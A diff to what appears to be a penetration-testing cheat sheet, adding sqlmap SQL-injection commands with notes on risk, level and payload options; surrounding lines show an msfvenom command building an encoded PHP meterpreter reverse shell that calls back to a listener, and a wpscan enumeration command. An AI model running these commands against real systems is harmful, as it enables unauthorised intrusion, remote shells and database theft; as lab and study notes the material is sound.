@@ -44,6 +44,20 @@
   	1. msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.4 LPORT=1337 -e php/base64 > shell.php
      		 
 		 append <?php ?> in the shell.php file
+		 
+# Sqlmap
+
+	1. python sqlmap -u “https://target.com/index.php?name=abc" --batch
+	If there are a lot of parameters within a single page, you could use the batch switch to save yourself some waiting 		time. What batch does is essentially skipping all user inputs and use the default option instead.
+	
+	2. python sqlmap -u “https://target.com/index.php?name=abc" --risk=3 --level=5
+	One could also increase the risk and level value for sqlmap to test for more payloads.
+	
+	3. python sqlmap -u “https://target.com/index.php?name=abc" --risk=3 --level=5 --exclude-sysdbs
+	In combination with --exclude-sysdbs only part of the schema containing non-system databases will be retrieved 		and shown.
+	
+	4. python sqlmap -u “https://target.com/index.php?name=abc" --risk=3 --level=5 --exclude-sysdbs --no-cast
+		--no-cast can also be used to decrease the payloads length
 
 # Wordpress Scanning
 	1. wpscan --url https://10.0.2.9:12038/blogblog --enumerate uvp
